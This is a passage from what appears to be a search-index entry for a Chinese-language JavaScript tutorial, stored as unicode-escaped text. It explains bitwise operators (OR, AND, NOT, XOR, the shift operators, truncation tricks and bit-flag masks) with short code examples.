\u8fdb\u884c\u4e00\u6b21\u6216\u8fd0\u7b97\uff0c\u8fd9\u4e2a\u4f4d\u8fd0\u7b97\u4f1a\u81ea\u52a8\u5c06\u4e00\u4e2a\u503c\u8f6c\u4e3a32\u4f4d\u6574\u6570\u3002\u4e0b\u9762\u662f\u8fd9\u4e2a\u51fd\u6570\u7684\u7528\u6cd5\u3002 1 2 3 4 5 6 toInt32 ( 1.001 ) // 1 toInt32 ( 1.999 ) // 1 toInt32 ( 1 ) // 1 toInt32 ( - 1 ) // -1 toInt32 ( Math . pow ( 2 , 32 ) + 1 ) // 1 toInt32 ( Math . pow ( 2 , 32 ) - 1 ) // -1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c toInt32 \u53ef\u4ee5\u5c06\u5c0f\u6570\u8f6c\u4e3a\u6574\u6570\u3002\u5bf9\u4e8e\u4e00\u822c\u7684\u6574\u6570\uff0c\u8fd4\u56de\u503c\u4e0d\u4f1a\u6709\u4efb\u4f55\u53d8\u5316\u3002\u5bf9\u4e8e\u5927\u4e8e\u6216\u7b49\u4e8e2\u768432\u6b21\u65b9\u7684\u6574\u6570\uff0c\u5927\u4e8e32\u4f4d\u7684\u6570\u4f4d\u90fd\u4f1a\u88ab\u820d\u53bb\u3002 \u4e8c\u8fdb\u5236\u6216\u8fd0\u7b97\u7b26 \u00b6 \u4e8c\u8fdb\u5236\u6216\u8fd0\u7b97\u7b26\uff08 | \uff09\u9010\u4f4d\u6bd4\u8f83\u4e24\u4e2a\u8fd0\u7b97\u5b50\uff0c\u4e24\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u4e4b\u4e2d\u53ea\u8981\u6709\u4e00\u4e2a\u4e3a 1 \uff0c\u5c31\u8fd4\u56de 1 \uff0c\u5426\u5219\u8fd4\u56de 0 \u3002 1 0 | 3 // 3 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c 0 \u548c 3 \u7684\u4e8c\u8fdb\u5236\u5f62\u5f0f\u5206\u522b\u662f 00 \u548c 11 \uff0c\u6240\u4ee5\u8fdb\u884c\u4e8c\u8fdb\u5236\u6216\u8fd0\u7b97\u4f1a\u5f97\u5230 11 \uff08\u5373 3 \uff09\u3002 \u4f4d\u8fd0\u7b97\u53ea\u5bf9\u6574\u6570\u6709\u6548\uff0c\u9047\u5230\u5c0f\u6570\u65f6\uff0c\u4f1a\u5c06\u5c0f\u6570\u90e8\u5206\u820d\u53bb\uff0c\u53ea\u4fdd\u7559\u6574\u6570\u90e8\u5206\u3002\u6240\u4ee5\uff0c\u5c06\u4e00\u4e2a\u5c0f\u6570\u4e0e 0 \u8fdb\u884c\u4e8c\u8fdb\u5236\u6216\u8fd0\u7b97\uff0c\u7b49\u540c\u4e8e\u5bf9\u8be5\u6570\u53bb\u9664\u5c0f\u6570\u90e8\u5206\uff0c\u5373\u53d6\u6574\u6570\u4f4d\u3002 1 2 2.9 | 0 // 2 - 2.9 | 0 // -2 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u79cd\u53d6\u6574\u65b9\u6cd5\u4e0d\u9002\u7528\u8d85\u8fc732\u4f4d\u6574\u6570\u6700\u5927\u503c 2147483647 \u7684\u6570\u3002 1 2 2147483649.4 | 0 ; // -2147483647 \u4e8c\u8fdb\u5236\u4e0e\u8fd0\u7b97\u7b26 \u00b6 \u4e8c\u8fdb\u5236\u4e0e\u8fd0\u7b97\u7b26\uff08 & \uff09\u7684\u89c4\u5219\u662f\u9010\u4f4d\u6bd4\u8f83\u4e24\u4e2a\u8fd0\u7b97\u5b50\uff0c\u4e24\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u4e4b\u4e2d\u53ea\u8981\u6709\u4e00\u4e2a\u4f4d\u4e3a 0 \uff0c\u5c31\u8fd4\u56de 0 \uff0c\u5426\u5219\u8fd4\u56de 1 \u3002 1 0 & 3 // 0 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c0\uff08\u4e8c\u8fdb\u5236 00 \uff09\u548c3\uff08\u4e8c\u8fdb\u5236 11 \uff09\u8fdb\u884c\u4e8c\u8fdb\u5236\u4e0e\u8fd0\u7b97\u4f1a\u5f97\u5230 00 \uff08\u5373 0 \uff09\u3002 \u4e8c\u8fdb\u5236\u5426\u8fd0\u7b97\u7b26 \u00b6 \u4e8c\u8fdb\u5236\u5426\u8fd0\u7b97\u7b26\uff08 ~ \uff09\u5c06\u6bcf\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u90fd\u53d8\u4e3a\u76f8\u53cd\u503c\uff08 0 \u53d8\u4e3a 1 \uff0c 1 \u53d8\u4e3a 0 \uff09\u3002\u5b83\u7684\u8fd4\u56de\u7ed3\u679c\u6709\u65f6\u6bd4\u8f83\u96be\u7406\u89e3\uff0c\u56e0\u4e3a\u6d89\u53ca\u5230\u8ba1\u7b97\u673a\u5185\u90e8\u7684\u6570\u503c\u8868\u793a\u673a\u5236\u3002 1 ~ 3 // -4 \u4e0a\u9762\u8868\u8fbe\u5f0f\u5bf9 3 \u8fdb\u884c\u4e8c\u8fdb\u5236\u5426\u8fd0\u7b97\uff0c\u5f97\u5230 -4 \u3002\u4e4b\u6240\u4ee5\u4f1a\u6709\u8fd9\u6837\u7684\u7ed3\u679c\uff0c\u662f\u56e0\u4e3a\u4f4d\u8fd0\u7b97\u65f6\uff0cJavaScript \u5185\u90e8\u5c06\u6240\u6709\u7684\u8fd0\u7b97\u5b50\u90fd\u8f6c\u4e3a32\u4f4d\u7684\u4e8c\u8fdb\u5236\u6574\u6570\u518d\u8fdb\u884c\u8fd0\u7b97\u3002 3 \u768432\u4f4d\u6574\u6570\u5f62\u5f0f\u662f 00000000000000000000000000000011 \uff0c\u4e8c\u8fdb\u5236\u5426\u8fd0\u7b97\u4ee5\u540e\u5f97\u5230 11111111111111111111111111111100 \u3002\u7531\u4e8e\u7b2c\u4e00\u4f4d\uff08\u7b26\u53f7\u4f4d\uff09\u662f1\uff0c\u6240\u4ee5\u8fd9\u4e2a\u6570\u662f\u4e00\u4e2a\u8d1f\u6570\u3002JavaScript \u5185\u90e8\u91c7\u7528\u8865\u7801\u5f62\u5f0f\u8868\u793a\u8d1f\u6570\uff0c\u5373\u9700\u8981\u5c06\u8fd9\u4e2a\u6570\u51cf\u53bb1\uff0c\u518d\u53d6\u4e00\u6b21\u53cd\uff0c\u7136\u540e\u52a0\u4e0a\u8d1f\u53f7\uff0c\u624d\u80fd\u5f97\u5230\u8fd9\u4e2a\u8d1f\u6570\u5bf9\u5e94\u768410\u8fdb\u5236\u503c\u3002\u8fd9\u4e2a\u6570\u51cf\u53bb1\u7b49\u4e8e 11111111111111111111111111111011 \uff0c\u518d\u53d6\u4e00\u6b21\u53cd\u5f97\u5230 00000000000000000000000000000100 \uff0c\u518d\u52a0\u4e0a\u8d1f\u53f7\u5c31\u662f -4 \u3002\u8003\u8651\u5230\u8fd9\u6837\u7684\u8fc7\u7a0b\u6bd4\u8f83\u9ebb\u70e6\uff0c\u53ef\u4ee5\u7b80\u5355\u8bb0\u5fc6\u6210\uff0c\u4e00\u4e2a\u6570\u4e0e\u81ea\u8eab\u7684\u53d6\u53cd\u503c\u76f8\u52a0\uff0c\u7b49\u4e8e-1\u3002 1 ~ - 3 // 2 \u4e0a\u9762\u8868\u8fbe\u5f0f\u53ef\u4ee5\u8fd9\u6837\u7b97\uff0c -3 \u7684\u53d6\u53cd\u503c\u7b49\u4e8e -1 \u51cf\u53bb -3 \uff0c\u7ed3\u679c\u4e3a 2 \u3002 \u5bf9\u4e00\u4e2a\u6574\u6570\u8fde\u7eed\u4e24\u6b21\u4e8c\u8fdb\u5236\u5426\u8fd0\u7b97\uff0c\u5f97\u5230\u5b83\u81ea\u8eab\u3002 1 ~~ 3 // 3 \u6240\u6709\u7684\u4f4d\u8fd0\u7b97\u90fd\u53ea\u5bf9\u6574\u6570\u6709\u6548\u3002\u4e8c\u8fdb\u5236\u5426\u8fd0\u7b97\u9047\u5230\u5c0f\u6570\u65f6\uff0c\u4e5f\u4f1a\u5c06\u5c0f\u6570\u90e8\u5206\u820d\u53bb\uff0c\u53ea\u4fdd\u7559\u6574\u6570\u90e8\u5206\u3002\u6240\u4ee5\uff0c\u5bf9\u4e00\u4e2a\u5c0f\u6570\u8fde\u7eed\u8fdb\u884c\u4e24\u6b21\u4e8c\u8fdb\u5236\u5426\u8fd0\u7b97\uff0c\u80fd\u8fbe\u5230\u53d6\u6574\u6548\u679c\u3002 1 2 3 4 ~~ 2.9 // 2 ~~ 47.11 // 47 ~~ 1.9999 // 1 ~~ 3 // 3 \u4f7f\u7528\u4e8c\u8fdb\u5236\u5426\u8fd0\u7b97\u53d6\u6574\uff0c\u662f\u6240\u6709\u53d6\u6574\u65b9\u6cd5\u4e2d\u6700\u5feb\u7684\u4e00\u79cd\u3002 \u5bf9\u5b57\u7b26\u4e32\u8fdb\u884c\u4e8c\u8fdb\u5236\u5426\u8fd0\u7b97\uff0cJavaScript \u5f15\u64ce\u4f1a\u5148\u8c03\u7528 Number \u51fd\u6570\uff0c\u5c06\u5b57\u7b26\u4e32\u8f6c\u4e3a\u6570\u503c\u3002 1 2 3 4 5 6 7 8 9 10 11 // \u76f8\u5f53\u4e8e~Number('011') ~ '011' // -12 // \u76f8\u5f53\u4e8e~Number('42 cats') ~ '42 cats' // -1 // \u76f8\u5f53\u4e8e~Number('0xcafebabe') ~ '0xcafebabe' // 889275713 // \u76f8\u5f53\u4e8e~Number('deadbeef') ~ 'deadbeef' // -1 Number \u51fd\u6570\u5c06\u5b57\u7b26\u4e32\u8f6c\u4e3a\u6570\u503c\u7684\u89c4\u5219\uff0c\u53c2\u89c1\u300a\u6570\u636e\u7684\u7c7b\u578b\u8f6c\u6362\u300b\u4e00\u7ae0\u3002 \u5bf9\u4e8e\u5176\u4ed6\u7c7b\u578b\u7684\u503c\uff0c\u4e8c\u8fdb\u5236\u5426\u8fd0\u7b97\u4e5f\u662f\u5148\u7528 Number \u8f6c\u4e3a\u6570\u503c\uff0c\u7136\u540e\u518d\u8fdb\u884c\u5904\u7406\u3002 1 2 3 4 5 6 7 8 // \u76f8\u5f53\u4e8e ~Number([]) ~ [] // -1 // \u76f8\u5f53\u4e8e ~Number(NaN) ~ NaN // -1 // \u76f8\u5f53\u4e8e ~Number(null) ~ null // -1 \u5f02\u6216\u8fd0\u7b97\u7b26 \u00b6 \u5f02\u6216\u8fd0\u7b97\uff08 ^ \uff09\u5728\u4e24\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u4e0d\u540c\u65f6\u8fd4\u56de 1 \uff0c\u76f8\u540c\u65f6\u8fd4\u56de 0 \u3002 1 0 ^ 3 // 3 \u4e0a\u9762\u8868\u8fbe\u5f0f\u4e2d\uff0c 0 \uff08\u4e8c\u8fdb\u5236 00 \uff09\u4e0e 3 \uff08\u4e8c\u8fdb\u5236 11 \uff09\u8fdb\u884c\u5f02\u6216\u8fd0\u7b97\uff0c\u5b83\u4eec\u6bcf\u4e00\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u90fd\u4e0d\u540c\uff0c\u6240\u4ee5\u5f97\u5230 11 \uff08\u5373 3 \uff09\u3002 \u201c\u5f02\u6216\u8fd0\u7b97\u201d\u6709\u4e00\u4e2a\u7279\u6b8a\u8fd0\u7528\uff0c\u8fde\u7eed\u5bf9\u4e24\u4e2a\u6570 a \u548c b \u8fdb\u884c\u4e09\u6b21\u5f02\u6216\u8fd0\u7b97\uff0c a^=b; b^=a; a^=b; \uff0c\u53ef\u4ee5 \u4e92\u6362 \u5b83\u4eec\u7684\u503c\u3002\u8fd9\u610f\u5473\u7740\uff0c\u4f7f\u7528\u201c\u5f02\u6216\u8fd0\u7b97\u201d\u53ef\u4ee5\u5728\u4e0d\u5f15\u5165\u4e34\u65f6\u53d8\u91cf\u7684\u524d\u63d0\u4e0b\uff0c\u4e92\u6362\u4e24\u4e2a\u53d8\u91cf\u7684\u503c\u3002 1 2 3 4 5 6 7 var a = 10 ; var b = 99 ; a ^= b , b ^= a , a ^= b ; a // 99 b // 10 \u8fd9\u662f\u4e92\u6362\u4e24\u4e2a\u53d8\u91cf\u7684\u503c\u7684\u6700\u5feb\u65b9\u6cd5\u3002 \u5f02\u6216\u8fd0\u7b97\u4e5f\u53ef\u4ee5\u7528\u6765\u53d6\u6574\u3002 1 12.9 ^ 0 // 12 \u5de6\u79fb\u8fd0\u7b97\u7b26 \u00b6 \u5de6\u79fb\u8fd0\u7b97\u7b26\uff08 << \uff09\u8868\u793a\u5c06\u4e00\u4e2a\u6570\u7684\u4e8c\u8fdb\u5236\u503c\u5411\u5de6\u79fb\u52a8\u6307\u5b9a\u7684\u4f4d\u6570\uff0c\u5c3e\u90e8\u8865 0 \uff0c\u5373\u4e58\u4ee5 2 \u7684\u6307\u5b9a\u6b21\u65b9\u3002\u5411\u5de6\u79fb\u52a8\u7684\u65f6\u5019\uff0c\u6700\u9ad8\u4f4d\u7684\u7b26\u53f7\u4f4d\u662f\u4e00\u8d77\u79fb\u52a8\u7684\u3002 1 2 3 4 5 6 7 8 // 4 \u7684\u4e8c\u8fdb\u5236\u5f62\u5f0f\u4e3a100\uff0c // \u5de6\u79fb\u4e00\u4f4d\u4e3a1000\uff08\u5373\u5341\u8fdb\u5236\u76848\uff09 // \u76f8\u5f53\u4e8e\u4e58\u4ee52\u76841\u6b21\u65b9 4 << 1 // 8 - 4 << 1 // -8 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c -4 \u5de6\u79fb\u4e00\u4f4d\u5f97\u5230 -8 \uff0c\u662f\u56e0\u4e3a -4 \u7684\u4e8c\u8fdb\u5236\u5f62\u5f0f\u662f 11111111111111111111111111111100 \uff0c\u5de6\u79fb\u4e00\u4f4d\u540e\u5f97\u5230 11111111111111111111111111111000 \uff0c\u8be5\u6570\u8f6c\u4e3a\u5341\u8fdb\u5236\uff08\u51cf\u53bb1\u540e\u53d6\u53cd\uff0c\u518d\u52a0\u4e0a\u8d1f\u53f7\uff09\u5373\u4e3a -8 \u3002 \u5982\u679c\u5de6\u79fb0\u4f4d\uff0c\u5c31\u76f8\u5f53\u4e8e\u5c06\u8be5\u6570\u503c\u8f6c\u4e3a32\u4f4d\u6574\u6570\uff0c\u7b49\u540c\u4e8e\u53d6\u6574\uff0c\u5bf9\u4e8e\u6b63\u6570\u548c\u8d1f\u6570\u90fd\u6709\u6548\u3002 1 2 3 4 5 13.5 << 0 // 13 - 13.5 << 0 // -13 \u5de6\u79fb\u8fd0\u7b97\u7b26\u7528\u4e8e\u4e8c\u8fdb\u5236\u6570\u503c\u975e\u5e38\u65b9\u4fbf\u3002 1 2 3 4 5 6 7 8 9 10 11 12 var color = { r : 186 , g : 218 , b : 85 }; // RGB to HEX // (1 << 24)\u7684\u4f5c\u7528\u4e3a\u4fdd\u8bc1\u7ed3\u679c\u662f6\u4f4d\u6570 var rgb2hex = function ( r , g , b ) { return '#' + (( 1 << 24 ) + ( r << 16 ) + ( g << 8 ) + b ) . toString ( 16 ) // \u5148\u8f6c\u6210\u5341\u516d\u8fdb\u5236\uff0c\u7136\u540e\u8fd4\u56de\u5b57\u7b26\u4e32 . substr ( 1 ); // \u53bb\u9664\u5b57\u7b26\u4e32\u7684\u6700\u9ad8\u4f4d\uff0c\u8fd4\u56de\u540e\u9762\u516d\u4e2a\u5b57\u7b26\u4e32 } rgb2hex ( color . r , color . g , color . b ) // \"#bada55\" \u4e0a\u9762\u4ee3\u7801\u4f7f\u7528\u5de6\u79fb\u8fd0\u7b97\u7b26\uff0c\u5c06\u989c\u8272\u7684 RGB \u503c\u8f6c\u4e3a HEX \u503c\u3002 \u53f3\u79fb\u8fd0\u7b97\u7b26 \u00b6 \u53f3\u79fb\u8fd0\u7b97\u7b26\uff08 >> \uff09\u8868\u793a\u5c06\u4e00\u4e2a\u6570\u7684\u4e8c\u8fdb\u5236\u503c\u5411\u53f3\u79fb\u52a8\u6307\u5b9a\u7684\u4f4d\u6570\u3002\u5982\u679c\u662f\u6b63\u6570\uff0c\u5934\u90e8\u5168\u90e8\u8865 0 \uff1b\u5982\u679c\u662f\u8d1f\u6570\uff0c\u5934\u90e8\u5168\u90e8\u8865 1 \u3002\u53f3\u79fb\u8fd0\u7b97\u7b26\u57fa\u672c\u4e0a\u76f8\u5f53\u4e8e\u9664\u4ee5 2 \u7684\u6307\u5b9a\u6b21\u65b9\uff08\u6700\u9ad8\u4f4d\u5373\u7b26\u53f7\u4f4d\u53c2\u4e0e\u79fb\u52a8\uff09\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 4 >> 1 // 2 /* // \u56e0\u4e3a4\u7684\u4e8c\u8fdb\u5236\u5f62\u5f0f\u4e3a 00000000000000000000000000000100\uff0c // \u53f3\u79fb\u4e00\u4f4d\u5f97\u5230 00000000000000000000000000000010\uff0c // \u5373\u4e3a\u5341\u8fdb\u5236\u76842 */ - 4 >> 1 // -2 /* // \u56e0\u4e3a-4\u7684\u4e8c\u8fdb\u5236\u5f62\u5f0f\u4e3a 11111111111111111111111111111100\uff0c // \u53f3\u79fb\u4e00\u4f4d\uff0c\u5934\u90e8\u88651\uff0c\u5f97\u5230 11111111111111111111111111111110, // \u5373\u4e3a\u5341\u8fdb\u5236\u7684-2 */ \u53f3\u79fb\u8fd0\u7b97\u53ef\u4ee5\u6a21\u62df 2 \u7684\u6574\u9664\u8fd0\u7b97\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 5 >> 1 // 2 // \u76f8\u5f53\u4e8e 5 / 2 = 2 21 >> 2 // 5 // \u76f8\u5f53\u4e8e 21 / 4 = 5 21 >> 3 // 2 // \u76f8\u5f53\u4e8e 21 / 8 = 2 21 >> 4 // 1 // \u76f8\u5f53\u4e8e 21 / 16 = 1 \u5934\u90e8\u8865\u96f6\u7684\u53f3\u79fb\u8fd0\u7b97\u7b26 \u00b6 \u5934\u90e8\u8865\u96f6\u7684\u53f3\u79fb\u8fd0\u7b97\u7b26\uff08 >>> \uff09\u4e0e\u53f3\u79fb\u8fd0\u7b97\u7b26\uff08 >> \uff09\u53ea\u6709\u4e00\u4e2a\u5dee\u522b\uff0c\u5c31\u662f\u4e00\u4e2a\u6570\u7684\u4e8c\u8fdb\u5236\u5f62\u5f0f\u5411\u53f3\u79fb\u52a8\u65f6\uff0c\u5934\u90e8\u4e00\u5f8b\u8865\u96f6\uff0c\u800c\u4e0d\u8003\u8651\u7b26\u53f7\u4f4d\u3002\u6240\u4ee5\uff0c\u8be5\u8fd0\u7b97\u603b\u662f\u5f97\u5230\u6b63\u503c\u3002\u5bf9\u4e8e\u6b63\u6570\uff0c\u8be5\u8fd0\u7b97\u7684\u7ed3\u679c\u4e0e\u53f3\u79fb\u8fd0\u7b97\u7b26\uff08 >> \uff09\u5b8c\u5168\u4e00\u81f4\uff0c\u533a\u522b\u4e3b\u8981\u5728\u4e8e\u8d1f\u6570\u3002 1 2 3 4 5 6 7 8 9 10 4 >>> 1 // 2 - 4 >>> 1 // 2147483646 /* // \u56e0\u4e3a-4\u7684\u4e8c\u8fdb\u5236\u5f62\u5f0f\u4e3a11111111111111111111111111111100\uff0c // \u5e26\u7b26\u53f7\u4f4d\u7684\u53f3\u79fb\u4e00\u4f4d\uff0c\u5f97\u523001111111111111111111111111111110\uff0c // \u5373\u4e3a\u5341\u8fdb\u5236\u76842147483646\u3002 */ \u8fd9\u4e2a\u8fd0\u7b97\u5b9e\u9645\u4e0a\u5c06\u4e00\u4e2a\u503c\u8f6c\u4e3a32\u4f4d\u65e0\u7b26\u53f7\u6574\u6570\u3002 \u67e5\u770b\u4e00\u4e2a\u8d1f\u6574\u6570\u5728\u8ba1\u7b97\u673a\u5185\u90e8\u7684\u50a8\u5b58\u5f62\u5f0f\uff0c\u6700\u5feb\u7684\u65b9\u6cd5\u5c31\u662f\u4f7f\u7528\u8fd9\u4e2a\u8fd0\u7b97\u7b26\u3002 1 - 1 >>> 0 // 4294967295 \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c -1 \u4f5c\u4e3a32\u4f4d\u6574\u6570\u65f6\uff0c\u5185\u90e8\u7684\u50a8\u5b58\u5f62\u5f0f\u4f7f\u7528\u65e0\u7b26\u53f7\u6574\u6570\u683c\u5f0f\u89e3\u8bfb\uff0c\u503c\u4e3a 4294967295\uff08\u5373 (2^32)-1 \uff0c\u7b49\u4e8e 11111111111111111111111111111111 \uff09\u3002 \u5f00\u5173\u4f5c\u7528 \u00b6 \u4f4d\u8fd0\u7b97\u7b26\u53ef\u4ee5\u7528\u4f5c\u8bbe\u7f6e\u5bf9\u8c61\u5c5e\u6027\u7684\u5f00\u5173\u3002 \u5047\u5b9a\u67d0\u4e2a\u5bf9\u8c61\u6709\u56db\u4e2a\u5f00\u5173\uff0c\u6bcf\u4e2a\u5f00\u5173\u90fd\u662f\u4e00\u4e2a\u53d8\u91cf\u3002\u90a3\u4e48\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u4e00\u4e2a\u56db\u4f4d\u7684\u4e8c\u8fdb\u5236\u6570\uff0c\u5b83\u7684\u6bcf\u4e2a\u4f4d\u5bf9\u5e94\u4e00\u4e2a\u5f00\u5173\u3002 1 2 3 4 var FLAG_A = 1 ; // 0001 var FLAG_B = 2 ; // 0010 var FLAG_C = 4 ; // 0100 var FLAG_D = 8 ; // 1000 \u4e0a\u9762\u4ee3\u7801\u8bbe\u7f6e A\u3001B\u3001C\u3001D \u56db\u4e2a\u5f00\u5173\uff0c\u6bcf\u4e2a\u5f00\u5173\u5206\u522b\u5360\u6709\u4e00\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u3002 \u7136\u540e\uff0c\u5c31\u53ef\u4ee5\u7528\u4e8c\u8fdb\u5236\u4e0e\u8fd0\u7b97\uff0c\u68c0\u67e5\u5f53\u524d\u8bbe\u7f6e\u662f\u5426\u6253\u5f00\u4e86\u6307\u5b9a\u5f00\u5173\u3002 1 2 3 4 5 6 var flags = 5 ; // \u4e8c\u8fdb\u5236\u76840101 if ( flags & FLAG_C ) { // ... } // 0101 & 0100 => 0100 => true \u4e0a\u9762\u4ee3\u7801\u68c0\u9a8c\u662f\u5426\u6253\u5f00\u4e86\u5f00\u5173 C \u3002\u5982\u679c\u6253\u5f00\uff0c\u4f1a\u8fd4\u56de true \uff0c\u5426\u5219\u8fd4\u56de false \u3002 \u73b0\u5728\u5047\u8bbe\u9700\u8981\u6253\u5f00 A \u3001 B \u3001 D \u4e09\u4e2a\u5f00\u5173\uff0c\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u63a9\u7801\u53d8\u91cf\u3002 1 2 var mask = FLAG_A | FLAG_B | FLAG_D ; // 0001 | 0010 | 1000 => 1011 \u4e0a\u9762\u4ee3\u7801\u5bf9 A \u3001 B \u3001 D \u4e09\u4e2a\u53d8\u91cf\u8fdb\u884c\u4e8c\u8fdb\u5236\u6216\u8fd0\u7b97\uff0c\u5f97\u5230\u63a9\u7801\u503c\u4e3a\u4e8c\u8fdb\u5236\u7684 1011 \u3002 \u6709\u4e86\u63a9\u7801\uff0c\u4e8c\u8fdb\u5236\u6216\u8fd0\u7b97\u53ef\u4ee5\u786e\u4fdd\u6253\u5f00\u6307\u5b9a\u7684\u5f00\u5173\u3002 1 flags = flags | mask ; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u8ba1\u7b97\u540e\u5f97\u5230\u7684 flags \u53d8\u91cf\uff0c\u4ee3\u8868\u4e09\u4e2a\u5f00\u5173\u7684\u4e8c\u8fdb\u5236\u4f4d\u90fd\u6253\u5f00\u4e86\u3002 \u4e8c\u8fdb\u5236\u4e0e\u8fd0\u7b97\u53ef\u4ee5\u5c06\u5f53\u524d\u8bbe\u7f6e\u4e2d\u51e1\u662f\u4e0e\u5f00\u5173\u8bbe\u7f6e\u4e0d\u4e00\u6837\u7684\u9879\uff0c\u5168\u90e8\u5173\u95ed\u3002 1 flags = flags & mask ; \u5f02\u6216\u8fd0\u7b97\u53ef\u4ee5\u5207\u6362\uff08toggle\uff09\u5f53\u524d\u8bbe\u7f6e\uff0c\u5373\u7b2c\u4e00\u6b21\u6267\u884c\u53ef\u4ee5\u5f97\u5230\u5f53\u524d\u8bbe\u7f6e\u7684\u76f8\u53cd\u503c\uff0c\u518d\u6267\u884c\u4e00\u6b21\u53c8\u5f97\u5230\u539f\u6765\u7684\u503c\u3002 1 flags = flags ^ mask ; \u4e8c\u8fdb\u5236\u5426\u8fd0\u7b97\u53ef\u4ee5\u7ffb\u8f6c\u5f53\u524d\u8bbe\u7f6e\uff0c\u5373\u539f\u8bbe\u7f6e\u4e3a 0 \uff0c\u8fd0\u7b97\u540e\u53d8\u4e3a 1 \uff1b\u539f\u8bbe\u7f6e\u4e3a 1 \uff0c\u8fd0\u7b97\u540e\u53d8\u4e3a 0 \u3002 1 flags = ~ flags ; \u53c2\u8003\u94fe\u63a5 \u00b6 Michal Budzynski, JavaScript: The less known parts. Bitwise Operators Axel Rauschmayer, Basic JavaScript for the impatient programmer Mozilla Developer Network, Bitwise Operators","title":"\u4e8c\u8fdb\u5236\u4f4d\u8fd0\u7b97\u7b26"},{"location":"operators/bit/#_1","text":"","title":"\u4e8c\u8fdb\u5236\u4f4d\u8fd0\u7b97\u7b26"},{"location":"operators/bit/#_2","text":"\u4e8c\u8fdb\u5236\u4f4d\u8fd0\u7b97\u7b26\u7528\u4e8e\u76f4\u63a5\u5bf9\u4e8c\u8fdb\u5236\u4f4d\u8fdb\u884c\u8ba1\u7b97\uff0c\u4e00\u5171\u67097\u4e2a\u3002 \u4e8c\u8fdb\u5236\u6216\u8fd0\u7b97\u7b26 \uff08or\uff09\uff1a\u7b26\u53f7\u4e3a | \uff0c\u8868\u793a\u82e5\u4e24\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u90fd\u4e3a 0 \uff0c\u5219\u7ed3\u679c\u4e3a 0 \uff0c\u5426\u5219\u4e3a 1 \u3002 \u4e8c\u8fdb\u5236\u4e0e\u8fd0\u7b97\u7b26 \uff08and\uff09\uff1a\u7b26\u53f7\u4e3a & \uff0c\u8868\u793a\u82e5\u4e24\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u90fd\u4e3a1\uff0c\u5219\u7ed3\u679c\u4e3a1\uff0c\u5426\u5219\u4e3a0\u3002 \u4e8c\u8fdb\u5236\u5426\u8fd0\u7b97\u7b26 \uff08not\uff09\uff1a\u7b26\u53f7\u4e3a ~ \uff0c\u8868\u793a\u5bf9\u4e00\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u53d6\u53cd\u3002 \u5f02\u6216\u8fd0\u7b97\u7b26 \uff08xor\uff09\uff1a\u7b26\u53f7\u4e3a ^ \uff0c\u8868\u793a\u82e5\u4e24\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u4e0d\u76f8\u540c\uff0c\u5219\u7ed3\u679c\u4e3a1\uff0c\u5426\u5219\u4e3a0\u3002 \u5de6\u79fb\u8fd0\u7b97\u7b26 \uff08left shift\uff09\uff1a\u7b26\u53f7\u4e3a << \uff0c\u8be6\u89c1\u4e0b\u6587\u89e3\u91ca\u3002 \u53f3\u79fb\u8fd0\u7b97\u7b26 \uff08right shift\uff09\uff1a\u7b26\u53f7\u4e3a >> \uff0c\u8be6\u89c1\u4e0b\u6587\u89e3\u91ca\u3002 \u5934\u90e8\u8865\u96f6\u7684\u53f3\u79fb\u8fd0\u7b97\u7b26 \uff08zero filled right shift\uff09\uff1a\u7b26\u53f7\u4e3a >>> \uff0c\u8be6\u89c1\u4e0b\u6587\u89e3\u91ca\u3002 \u8fd9\u4e9b\u4f4d\u8fd0\u7b97\u7b26\u76f4\u63a5\u5904\u7406\u6bcf\u4e00\u4e2a\u6bd4\u7279\u4f4d\uff08bit\uff09\uff0c\u6240\u4ee5\u662f\u975e\u5e38\u5e95\u5c42\u7684\u8fd0\u7b97\uff0c\u597d\u5904\u662f\u901f\u5ea6\u6781\u5feb\uff0c\u7f3a\u70b9\u662f\u5f88\u4e0d\u76f4\u89c2\uff0c\u8bb8\u591a\u573a\u5408\u4e0d\u80fd\u4f7f\u7528\u5b83\u4eec\uff0c\u5426\u5219\u4f1a\u4f7f\u4ee3\u7801\u96be\u4ee5\u7406\u89e3\u548c\u67e5\u9519\u3002 \u6709\u4e00\u70b9\u9700\u8981\u7279\u522b\u6ce8\u610f\uff0c\u4f4d\u8fd0\u7b97\u7b26\u53ea\u5bf9\u6574\u6570\u8d77\u4f5c\u7528\uff0c\u5982\u679c\u4e00\u4e2a\u8fd0\u7b97\u5b50\u4e0d\u662f\u6574\u6570\uff0c\u4f1a\u81ea\u52a8\u8f6c\u4e3a\u6574\u6570\u540e\u518d\u6267\u884c\u3002\u53e6\u5916\uff0c\u867d\u7136\u5728 JavaScript \u5185\u90e8\uff0c\u6570\u503c\u90fd\u662f\u4ee564\u4f4d\u6d6e\u70b9\u6570\u7684\u5f62\u5f0f\u50a8\u5b58\uff0c\u4f46\u662f\u505a\u4f4d\u8fd0\u7b97\u7684\u65f6\u5019\uff0c\u662f\u4ee532\u4f4d\u5e26\u7b26\u53f7\u7684\u6574\u6570\u8fdb\u884c\u8fd0\u7b97\u7684\uff0c\u5e76\u4e14\u8fd4\u56de\u503c\u4e5f\u662f\u4e00\u4e2a32\u4f4d\u5e26\u7b26\u53f7\u7684\u6574\u6570\u3002 1 i = i | 0 ; \u4e0a\u9762\u8fd9\u884c\u4ee3\u7801\u7684\u610f\u601d\uff0c\u5c31\u662f\u5c06 i \uff08\u4e0d\u7ba1\u662f\u6574\u6570\u6216\u5c0f\u6570\uff09\u8f6c\u4e3a32\u4f4d\u6574\u6570\u3002 